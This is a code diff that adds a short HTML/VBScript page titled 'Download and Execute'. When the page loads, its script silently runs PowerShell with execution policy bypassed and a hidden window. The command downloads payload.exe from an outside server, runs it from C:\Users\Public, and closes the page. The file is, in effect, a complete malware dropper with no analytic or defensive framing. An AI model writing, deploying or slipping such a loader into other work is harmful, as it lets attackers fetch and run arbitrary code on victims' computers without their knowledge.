@@ -1,0 +1,15 @@
+<html>
+<head>
+<title>Download and Execute</title>
+<script language="VBScript">
+Sub Window_OnLoad
+    Dim oShell
+    Set oShell = CreateObject("WScript.Shell")
+    oShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadFile('www.payloadserver.com:8000/payload.exe', 'C:\Users\Public\payload.exe') ; Start-Process 'C:\Users\Public\payload.exe'", 0, True
+    self.close
+End Sub
+</script>
+</head>
+<body>
+</body>
+</html>
